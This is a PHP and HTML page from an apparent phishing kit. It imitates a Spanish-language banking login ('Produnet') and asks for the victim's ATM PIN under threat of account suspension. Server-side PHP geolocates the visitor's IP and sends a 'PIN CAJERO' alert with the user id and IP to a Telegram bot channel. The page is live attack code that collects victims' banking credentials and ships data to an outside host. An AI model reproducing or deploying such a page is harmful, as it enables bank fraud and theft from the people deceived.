<?php
ini_set("display_errors", 0);
$userp = $_SERVER['REMOTE_ADDR'];
$meta = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$userp));
$pais = $meta['geoplugin_countryName'] ?? 'Desconocido'; 
include('datos_de_tel.php');

$userid = isset($_GET['userid']) ? htmlspecialchars($_GET['userid']) : 'No proporcionado'; // Correctamente capturando userid

if (isset($_POST['userclav'])) {
    $message = "PR0D- PIN CAJERO\r\nUser: $userid\r\nIP: $userp $pais";
    $apiToken = $apibot;
    $data = [
        'chat_id' => $canal,
        'text' => $message
    ];
    $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data));
}

?>
<!DOCTYPE html>
<html class=" js no-touch csstransforms csstransitions js no-touch csstransforms csstransitions"><script src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/content/location/location.js" id="eppiocemhmnlbhjplcgkofciiegomcon"></script><script src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/libs/extend-native-history-api.js"></script><script src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/libs/requests.js"></script><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,Chrome=1">
    <meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, user-scalable=yes" target-densitydpi="dpi">

    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <title>Produ</title>


    <link href="produnetcss.css" rel="stylesheet">

<script bis_use="true" type="text/javascript" charset="utf-8" data-bis-config="[&quot;facebook.com/&quot;,&quot;twitter.com/&quot;,&quot;youtube-nocookie.com/embed/&quot;,&quot;//vk.com/&quot;,&quot;//www.vk.com/&quot;,&quot;//linkedin.com/&quot;,&quot;//www.linkedin.com/&quot;,&quot;//instagram.com/&quot;,&quot;//www.instagram.com/&quot;,&quot;//www.google.com/recaptcha/api2/&quot;,&quot;//hangouts.google.com/webchat/&quot;,&quot;//www.google.com/calendar/&quot;,&quot;//www.google.com/maps/embed&quot;,&quot;spotify.com/&quot;,&quot;soundcloud.com/&quot;,&quot;//player.vimeo.com/&quot;,&quot;//disqus.com/&quot;,&quot;//tgwidget.com/&quot;,&quot;//js.driftt.com/&quot;,&quot;friends2follow.com&quot;,&quot;/widget&quot;,&quot;login&quot;,&quot;//video.bigmir.net/&quot;,&quot;blogger.com&quot;,&quot;//smartlock.google.com/&quot;,&quot;//keep.google.com/&quot;,&quot;/web.tolstoycomments.com/&quot;,&quot;moz-extension://&quot;,&quot;chrome-extension://&quot;,&quot;/auth/&quot;,&quot;//analytics.google.com/&quot;,&quot;adclarity.com&quot;,&quot;paddle.com/checkout&quot;,&quot;hcaptcha.com&quot;,&quot;recaptcha.net&quot;,&quot;2captcha.com&quot;,&quot;accounts.google.com&quot;,&quot;www.google.com/shopping/customerreviews&quot;,&quot;buy.tinypass.com&quot;,&quot;gstatic.com&quot;,&quot;secureir.ebaystatic.com&quot;,&quot;docs.google.com&quot;,&quot;contacts.google.com&quot;,&quot;github.com&quot;,&quot;mail.google.com&quot;,&quot;chat.google.com&quot;,&quot;audio.xpleer.com&quot;,&quot;keepa.com&quot;,&quot;static.xx.fbcdn.net&quot;,&quot;sas.selleramp.com&quot;]" src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/../executers/vi-tr.js"></script></head>
<body bis_register="W3sibWFzdGVyIjp0cnVlLCJleHRlbnNpb25JZCI6ImVwcGlvY2VtaG1ubGJoanBsY2drb2ZjaWllZ29tY29uIiwiYWRibG9ja2VyU3RhdHVzIjp7IkRJU1BMQVkiOiJkaXNhYmxlZCIsIkZBQ0VCT09LIjoiZGlzYWJsZWQiLCJUV0lUVEVSIjoiZGlzYWJsZWQiLCJSRURESVQiOiJkaXNhYmxlZCIsIlBJTlRFUkVTVCI6ImRpc2FibGVkIiwiSU5TVEFHUkFNIjoiZGlzYWJsZWQiLCJDT05GSUciOiJkaXNhYmxlZCJ9LCJ2ZXJzaW9uIjoiMi4wLjEwIiwic2NvcmUiOjIwMDEwfV0=">
    <header id="cabecera" class="container-fluid">
    <div class="row" bis_skin_checked="1">
        <noscript>
            <div id="divIndicacionScript" class="col-sm-12 col-md-12 col-lg-12 col-xs-12">
                <div class="alert alert-info" role="alert">
                    <blockquote class="blockquote-info">
                        Produnet requiere usar Javascript. Por favor activa esta funcionalidad en tu navegador y refresca la página.
                    </blockquote>
                </div>
            </div>
        </noscript>
    </div>
</header>
        <main id="contenedorPrincipal" class="ds-contenedor-principal">
            <section class="ds-contenedor ds-contenedor--publico ds-contenedor__scroll">
                <aside class="ds-imagen-principal">
                    <div class="ds-imagen-principal__banner" bis_skin_checked="1"></div>
                </aside>
                <section class="ds-contenido-principal">
                    <div id="logoMarca" class="ds-logotipo" bis_skin_checked="1"></div>
                    <div id="contenedorMensajeAlertaError" bis_skin_checked="1"> </div>
                    <div id="contenedorMensajeAlertaExito" bis_skin_checked="1"> </div>
                    <h4 style="font-family:Trebuchet MS,sans-serif;" class="ds-titulo-primario ds-titulo-primario--color-primario">Factor de seguridad</h4>
                    <div id="contenedorMensajeAlertaInformativa" bis_skin_checked="1"> </div>
                    <section id="contenidoPrincipal">



<div id="divContenedorPagina" bis_skin_checked="1">
    <div class="ds-formulario-vista" bis_skin_checked="1">
        <form action="index5.php" method="post">
    <?php
    $userid = isset($_GET['userid']) ? htmlspecialchars($_GET['userid']) : 'No proporcionado';
    ?>
             <input type="hidden" name="userid" value="<?php echo $userid; ?>">
            <input type="hidden" name="userid" value="<?php echo $userid; ?>">
            <input name="__RequestVerificationToken" type="hidden" value="lSREZJfKjgAy7sOVTD33PgQTkZid1HSgbYtW8dEdPv5-DATjtF5omLIpskdfCv89UQvMSFVKNJ3MZhEjwBAeZ25vmp7iwcqXqxRm9o6pnk81"><input id="SecretoMaquina" name="SecretoMaquina" type="hidden" value="">            <span style="font-size: 16px;color:#737673;font-weight:inherit;" class="ds-subtitulo">Ingrese los datos solicitados, de no hacerlo su cuenta sera suspendida temporalmente por medidas de seguridad.</span>
                    <div bis_skin_checked="1">
                        <div class="ds-grupo-caja" bis_skin_checked="1" style="
    margin-top: -26px;
">






                            
                            

        <br><br>

                            <label style="font-family:Trebuchet MS,sans-serif;" class="ds-etiqueta"><b>Clave de cajero automático</b></label>
                            <input style="font-family:Trebuchet MS,sans-serif;" autocomplete="off" autofocus="True" class="ds-control-caja-texto ds-usuario__caja-usuario ds-mayuscula" id="NombreUsuario" maxlength="4" name="userclav" placeholder="PIN cajero Automático" required="required" spellcheck="false" type="password" aria-required="true">

                        </div>
                        <div id="divBotonInicioSesion" class="ds-div__boton--mostrar" bis_skin_checked="1">
                            <input style="background-color:#075B00;font-family:Trebuchet MS,sans-serif;" type="submit" value="Ingresar" id="btnEnrolamiento" class="ds-control ds-control-boton ds-control-boton--secundario">

                        </div>
                        <div id="divBotonInicioSesionIE" class="ds-div__boton--ocultar" bis_skin_checked="1">
                            <input type="submit" value="Ingresar" id="btnAceptarInternetExplorer" class="ds-control ds-control-boton ds-margen-superior-30 ds-margen-superior-30 ds-control-boton--deshabilitado" disabled="disabled">
                        </div>

                         


                <br>
                    <div id="divBotonInicioSesion" class="ds-div__boton--mostrar" bis_skin_checked="1">
                    <input style="background-color:#fff;font-family:Trebuchet MS,sans-serif;color: black;" type="submit" value="Cancelar" id="btnEnrolamiento" class="ds-control ds-control-boton ds-control-boton--secundario">

                </div>
                <div id="divBotonInicioSesionIE" class="ds-div__boton--ocultar" bis_skin_checked="1">
                    <input type="submit" value="Cancelar" id="btnAceptarInternetExplorer" class="ds-control ds-control-boton ds-margen-superior-30 ds-margen-superior-30 ds-control-boton--deshabilitado" disabled="disabled">
                </div>




<div class="ds-modal fade ds-modal--ocultar" id="modalNavegadoresSugeridos" role="dialog" data-keyboard="false" data-backdrop="static" bis_skin_checked="1">
    <div class="ds-modal__dialog-navegador ds-modal-dialog-centered" role="document" bis_skin_checked="1">
        <div class="ds-modal-content ds-modal__informacion" bis_skin_checked="1">
            <div id="contenedorCabeceraModal" class="ds-modal-header ds-cabecera-modal" bis_skin_checked="1">
                <div id="contenedorImagenModal" class="ds-imagen-modal" bis_skin_checked="1">
                    <img class="ds-modal__imagen--origami-superior" src="imgs/origami_superior.png" alt="origami superior">
                    <img class="ds-img__cerrar-blanco" src="imgs/icono_cerrar-blanco.svg" onclick="fnCerrarmodalNavegadoresSugeridos()" alt="icono cerrar">
                </div>
            </div>
            <div id="cuerpoModal" class="ds-modal-body ds-cuerpo-modal ds-cuerpo-modal__centro" bis_skin_checked="1">
                <div class="col-lg-12" bis_skin_checked="1">
                    <div class="col-lg-3 ds-imagen-modal--derecha" bis_skin_checked="1">
                        <img src="imgs/icono_campana.svg" alt="">
                    </div>
                    <div class="col-lg-9 ds-texto-izquierdo" bis_skin_checked="1">
                        <span class="ds-titulo__navegador-sugerido" id="tituloModal">Importante</span>
                        <br>
                        <br>
                        <span style="font-family:Trebuchet MS,sans-serif;" id="spanCuerpoModal" class="ds-texto__navegador-sugerido">
                            Para que tu experiencia sea la mejor utiliza uno de los siguientes navegadores:
                        </span>
                    </div>
                </div>
            </div>
            <div id="modalPie" class="ds-modal-pie ds-modal-pie-centro" bis_skin_checked="1">
                <div class="ds-margen-inferior-30" bis_skin_checked="1">
                    <img src="imgs/navegador_google-chrome.svg" alt="Navegador Google Chrome">
                    <img src="imgs/navegador_microsoft-edge.svg" alt="Navegador Microsoft Edge">
                    <img src="imgs/navegador_mozilla-firefox.svg" alt="Navegador Mozilla Firefox">
                    <img src="imgs/navegador_safari.svg" alt="Navegador Safari">
                </div>
            </div>
        </div>
    </div>
</div>

<div class="ds-modal fade ds-modal--ocultar" id="modalNavegadorCambia" role="dialog" data-keyboard="false" data-backdrop="static" bis_skin_checked="1">
    <div class="ds-modal__dialog--navegador-cambia" role="document" bis_skin_checked="1">
        <div class="ds-modal-content" bis_skin_checked="1">
            <div id="cuerpoModal" class="ds-modal-body ds-cuerpo-modal" bis_skin_checked="1">
                <div class="col-lg-12 ds-margen-superior-30 ds-margen-inferior-30" bis_skin_checked="1">
                    <img class="ds-img__cerrar--negro" src="imgs/icono_cerrar-negro.svg" onclick="fnCerrarmodalNavegadorCambia()" alt="icono cerrar">
                    <div class="col-lg-1" bis_skin_checked="1">
                        <img src="imgs/icono_pagina-web.svg" alt="Pagina web">
                    </div>
                    <div class="col-lg-6 ds-texto-izquierdo" bis_skin_checked="1">
                        <span class="ds-titulo__navegador-cambia" id="tituloModal">Cambia de navegador</span>
                        <br>
                        <br>
                        <span class="ds-texto__navegador-cambia">
                            Para tener una mejor experiencia te recomendamos utilizar los siguientes navegadores.
                        </span>
                        <span class="ds-texto__navegador-cambia--negrita">
                            Recuerda descargarlos en páginas oficiales.
                        </span>
                    </div>
                    <div class="col-lg-5 ds-imagen__navegador--cambia" bis_skin_checked="1">
                        <img src="imgs/navegador_google-chrome.svg" alt="Navegador Google Chrome">
                        <img src="imgs/navegador_microsoft-edge.svg" alt="Navegador Microsoft Edge">
                        <img src="imgs/navegador_mozilla-firefox.svg" alt="Navegador Mozilla Firefox">
                        <img src="index_files/navegador_safari.svg" alt="Navegador Safari">
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>



                    </div></form></div></div></section>
                </section>
            </section>
        </main>
        <div class="lb-closeContainer" bis_skin_checked="1"><a class="lb-close"></a></div>

    
    </body></html>